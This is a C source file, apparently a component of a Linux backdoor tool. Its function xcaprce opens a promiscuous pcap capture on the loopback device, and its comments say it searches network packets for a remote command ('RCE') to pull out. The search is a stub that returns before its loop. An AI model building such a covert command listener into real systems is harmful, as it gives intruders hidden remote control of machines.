// Copyright © 2022 Kris Nóva <kris@nivenly.com>
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//
// ███╗   ██╗ ██████╗ ██╗   ██╗ █████╗
// ████╗  ██║██╔═████╗██║   ██║██╔══██╗
// ██╔██╗ ██║██║██╔██║██║   ██║███████║
// ██║╚██╗██║████╔╝██║╚██╗ ██╔╝██╔══██║
// ██║ ╚████║╚██████╔╝ ╚████╔╝ ██║  ██║
// ╚═╝  ╚═══╝ ╚═════╝   ╚═══╝  ╚═╝  ╚═╝
//
// [dpi.c]

#include <linux/types.h>
#include <pcap.h>
#include <string.h>
// clang-format off
#include "dpi.h"
#include "common.h"
// clang-format on

// TODO Use #IF statements to compile different xcap implementations

// xcaprce is the main "interface" for pulling an RCE
// out of the kernel.
//
// Different implementations may exist, for the first example
// we are just using pcap.h
int xcaprce(__u8 saddr[4], char *rce) {
  boopprintf(" -> xCap searching kernel packets for RCE\n");
  // Taken from TCPDump

  // TODO Plumb this through to the CLI interface
  // TODO Use XDP instead of pcap (compile time)

  // TCP Dump filter
  char filter_exp[] = "";

  pcap_t *handle; /* Session handle */
  // char *dev;			  /* The device to sniff on */
  char errbuf[PCAP_ERRBUF_SIZE]; /* Error string */
  struct bpf_program fp;         /* The compiled filter */
  bpf_u_int32 mask;              /* Our netmask */
  bpf_u_int32 net;               /* Our IP */
  struct pcap_pkthdr header;     /* The header that pcap gives us */
  const u_char *packet;          /* The actual packet */

  char *dev = "lo";
  //  dev = pcap_lookupdev(errbuf);   /* Define the device */
  //  if (dev == NULL) {
  //    boopprintf("Couldn't find default device: %s\n", errbuf);
  //    return 2;
  //  }
  boopprintf(" -> pcap device: %s\n", dev);
  /* Find the properties for the device */
  if (pcap_lookupnet(dev, &net, &mask, errbuf) == -1) {
    boopprintf("Couldn't get netmask for device %s: %s\n", dev, errbuf);
    net = 0;
    mask = 0;
  }
  /* Open the session in promiscuous mode */
  handle = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
  if (handle == NULL) {
    boopprintf("Couldn't open device %s: %s\n", dev, errbuf);
    return 2;
  }
  /* Compile and apply the filter */
  if (pcap_compile(handle, &fp, filter_exp, 0, net) == -1) {
    boopprintf("Couldn't parse filter %s: %s\n", filter_exp,
               pcap_geterr(handle));
    return 2;
  }
  if (pcap_setfilter(handle, &fp) == -1) {
    boopprintf("Couldn't install filter %s: %s\n", filter_exp,
               pcap_geterr(handle));
    return 2;
  }

  boopprintf(" -> Kernel packets:\n");

  /* Search for RCE */
  return 0;
  while (1) {
    packet = pcap_next(handle, &header);
    for (int i = 0; i < 1500; i++) {
      printf("%u", packet[i]);
    }
    printf("\n");
    printf(" --- \n");
    printf("\n");
  }

  return 0;
}
